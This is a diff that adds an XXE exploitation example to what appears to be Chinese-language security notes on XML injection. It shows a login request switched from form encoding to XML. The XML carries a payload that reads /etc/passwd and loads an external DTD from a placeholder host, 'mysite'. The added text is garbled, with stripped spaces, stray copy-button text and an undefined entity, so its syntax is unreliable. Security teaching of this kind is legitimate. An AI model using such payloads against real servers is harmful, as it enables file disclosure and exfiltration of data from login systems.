@@ -83,6 +83,39 @@ XInclude
     <?xml version='1.0'?>
     <data xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://publicServer.com/file.xml"></xi:include></data>
 
+
+利用场景
+--------------------------------------
+
+登录（Content-type宽容解析）
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+::
+
+    POST/logInHTTP/1.1
+    Host:www.company.com
+    User-Agent:Mozilla/5.0
+    Content-Type:application/x-www-form-urlencoded
+    Origin:https://www.company.com
+    Content-Length:Number
+
+    email=me@gmail.com&password=*****************&captcha=Random
+
+    POST/logInHTTP/1.1
+    Host:www.company.com
+    User-Agent:Mozilla/5.0
+    Content-Type:application/xml
+    Origin:https://www.company.com
+    Content-Length:Number
+
+    <?xmlversion="1.0"encoding="UTF-8"standalone="yes"?>
+    Code64BytesUnwraplinesCopyDownload
+    <!DOCTYPEroot[
+    <!ENTITY%bPUBLIC"lol""file:///etc/passwd">
+    <!ENTITY%asdPUBLIC"lol""http://mysite/xx.html">
+    %asd;
+    %rrr;]>
+    <login><username>demo@informatica.com</username><password>*****</password></login>
+
 参考链接
 --------------------------------------
 - `XML教程 <http://www.w3school.com.cn/xml/>`_
